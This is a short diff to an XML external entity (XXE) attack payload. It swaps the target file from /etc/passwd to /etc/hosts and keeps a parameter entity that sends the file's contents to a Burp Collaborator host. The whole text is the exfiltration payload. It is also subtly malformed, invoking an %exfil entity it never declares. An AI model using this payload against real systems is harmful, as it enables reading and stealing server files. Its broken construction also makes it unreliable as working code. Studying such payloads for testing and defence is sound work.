@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % file SYSTEM "file:///etc/hosts">
 <!ENTITY % eval SYSTEM "http://88ekoffcxntnzfndvi9rilpi79db10.burpcollaborator.net/?x=%file;">
 %eval;
 %exfil;
